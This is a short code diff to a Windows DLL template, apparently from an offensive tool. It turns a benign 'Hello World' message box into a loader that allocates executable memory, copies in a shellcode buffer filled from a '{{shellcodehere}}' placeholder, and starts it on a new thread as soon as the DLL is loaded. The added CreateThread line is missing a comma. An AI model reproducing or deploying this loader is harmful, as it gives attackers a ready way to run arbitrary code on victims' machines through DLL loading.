@@ -6,7 +6,7 @@
 
 {{shellcodehere}}
 
-void ExecuteShellcode()
+DWORD WINAPI EXEC()
 {
 	void *exec = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	memcpy(exec, buf, sizeof(buf));
@@ -26,7 +26,7 @@ BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
 			break;
 		case DLL_PROCESS_ATTACH:
 			hAppInstance = hinstDLL;
-			MessageBoxA( NULL, "Hello World!", "Hello to this World!", MB_ICONINFORMATION );
+			CreateThread(NULL , 0, EXEC, NULL, 0 NULL);
 			break;
 		case DLL_PROCESS_DETACH:
 		case DLL_THREAD_ATTACH:
